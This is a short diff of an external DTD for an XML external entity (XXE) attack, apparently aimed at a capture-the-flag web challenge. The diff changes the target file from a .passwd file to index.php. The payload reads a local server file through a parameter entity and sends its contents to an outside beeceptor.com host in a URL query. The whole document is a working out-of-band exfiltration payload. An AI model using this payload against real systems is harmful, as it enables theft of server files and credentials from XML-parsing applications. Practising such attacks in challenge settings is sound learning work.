@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!ENTITY % file SYSTEM "file:///challenge/web-serveur/ch29/.passwd">
+<!ENTITY % file SYSTEM "file:///challenge/web-serveur/ch29/index.php">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://poilu.free.beeceptor.com?x=%file;'>">
 %eval;
 %exfiltrate;
